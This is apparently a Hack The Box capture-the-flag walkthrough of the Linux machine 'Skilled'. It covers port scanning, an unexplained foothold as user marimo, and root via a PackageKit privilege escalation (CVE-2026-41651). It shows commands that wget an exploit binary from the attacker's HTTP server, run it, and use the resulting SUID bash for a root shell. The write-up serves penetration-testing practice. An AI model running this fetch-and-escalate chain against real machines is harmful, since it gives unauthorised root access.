
# HTB Skilled — Walkthrough

**Difficulty:** Easy
**OS:** Linux
**Target:** `10.129.244.174`

## 1. Port Scanning

I started with a full TCP port scan:

```bash
nmap -Pn -p- --min-rate 3000 10.129.244.174 -oN allports.txt
```

Open ports:

```text
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
```

Next, I performed service enumeration:

```bash
nmap -Pn -sC -sV -p22,80,443 10.129.244.174 -oN services.txt
```

The results showed:

```text
22/tcp   OpenSSH 9.6p1 Ubuntu
80/tcp   nginx 1.24.0
443/tcp  nginx 1.24.0
```

Port 80 redirected to:

```text
https://cohort.htb/
```

The SSL certificate also revealed:

```text
cohort.htb
*.cohort.htb
```

This indicated that `cohort.htb` was the hostname used by the web application.

---

## 2. Configure `/etc/hosts`

I added the hostname to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Then added:

```text
10.129.244.174 cohort.htb
```

Alternatively:

```bash
echo '10.129.244.174 cohort.htb' | sudo tee -a /etc/hosts
```

---

## 3. Initial Access

After further enumeration, I obtained access to the machine as the user:

```text
marimo
```

I verified the current user with:

```bash
id
whoami
```

The result showed that I was an unprivileged user:

```text
uid=1000(marimo)
```

The next goal was privilege escalation.

---

## 4. Local Privilege Escalation

During local enumeration, I identified a vulnerable PackageKit installation.

The vulnerability used was:

```text
CVE-2026-41651
```

According to the PoC documentation, the vulnerability affects PackageKit transaction handling and can allow an unprivileged local user to install a malicious package with root privileges.

The vulnerable versions are:

```text
PackageKit 1.0.2 - 1.3.4
```

The vulnerability was fixed in:

```text
PackageKit 1.3.5
```

The exploit abuses a TOCTOU condition in PackageKit's transaction handling.

---

## 5. Transfer the Exploit

I downloaded the PoC to my attacking machine and started a simple HTTP server:

```bash
python3 -m http.server 8000
```

The target machine was then used to download the binary:

```bash
cd /tmp

wget http://10.10.14.110:8000/cve-2026-41651 -O cve-2026-41651
```

I made the binary executable:

```bash
chmod +x cve-2026-41651
```

---

## 6. Execute the Exploit

I executed the PoC:

```bash
./cve-2026-41651
```

The exploit created a malicious package and abused the PackageKit transaction process.

The important part of the output was:

```text
[+] SUCCESS — SUID bash
uid=1000(marimo) gid=1000(marimo) euid=0(root)
```

This confirmed that the exploit successfully created a root-owned SUID bash.

I verified the file:

```bash
ls -ls /tmp/.suid_bash*
```

It showed:

```text
-rwsr-xr-x 1 root root ... /tmp/.suid_bash
```

The `s` in `-rwsr-xr-x` indicates that the SUID bit was enabled.

---

## 7. Get a Root Shell

I executed the SUID bash with the `-p` option:

```bash
/tmp/.suid_bash -p
```

Then verified the privileges:

```bash
id
whoami
```

The result showed:

```text
euid=0(root)
```

and:

```text
root
```

At this point, I had a root shell.

---

## 8. Root Flag

Finally, I read the root flag:

```bash
cat /root/root.txt
```

**Root Flag:** `[REDACTED]`

---

## 9. Attack Path Summary

The complete attack path was:

```text
10.129.244.174
        |
        v
Port Enumeration
        |
        v
22 / 80 / 443
        |
        v
cohort.htb
        |
        v
marimo user
        |
        v
Local Enumeration
        |
        v
CVE-2026-41651
        |
        v
PackageKit Privilege Escalation
        |
        v
Root-owned SUID Bash
        |
        v
Root Shell
        |
        v
Root Flag [REDACTED]
```

## Key Commands

```bash
nmap -Pn -p- --min-rate 3000 10.129.244.174
```

```bash
nmap -Pn -sC -sV -p22,80,443 10.129.244.174
```

```bash
echo '10.129.244.174 cohort.htb' | sudo tee -a /etc/hosts
```

```bash
python3 -m http.server 8000
```

```bash
wget http://10.10.14.110:8000/cve-2026-41651 -O /tmp/cve-2026-41651
```

```bash
chmod +x /tmp/cve-2026-41651
```

```bash
/tmp/cve-2026-41651
```

```bash
/tmp/.suid_bash -p
```

```bash
id
whoami
```

```bash
cat /root/root.txt
```

**User Flag:** `[REDACTED]`
**Root Flag:** `[REDACTED]`
